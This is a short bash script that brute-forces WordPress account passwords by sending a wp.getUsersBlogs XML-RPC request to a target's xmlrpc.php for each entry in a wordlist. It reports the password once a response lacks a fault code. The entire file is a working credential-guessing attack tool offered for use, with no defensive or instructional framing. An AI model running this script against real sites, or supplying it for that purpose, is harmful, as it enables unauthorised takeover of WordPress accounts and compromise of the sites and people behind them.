#!/bin/bash

if [ $# -ne 3 ]
then
        echo "Error!"
        echo "Correct syntax: $0 <username> <ip-adress> <dictionary-route>"
        exit 2
else

function salir(){
        exit 1
}

trap salir SIGINT 

for i in $(cat $3); do
        variable=$(cat <<FIN
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>$1</value></param>
<param><value>$i</value></param>
</params>
</methodCall>
FIN
        )

        echo -e "$variable" >> enviar.xml
        echo -e "[+] Password tested: $i"

        curl -s -X POST "http://$2/xmlrpc.php" -d@enviar.xml >> log.log

        if [ ! "$(cat log.log | grep 'faultCode')" ]; then
                echo -e "[+] The password for $1 is: $i"
                exit 0
        fi

        sleep 1

rm log.log enviar.xml

done
fi
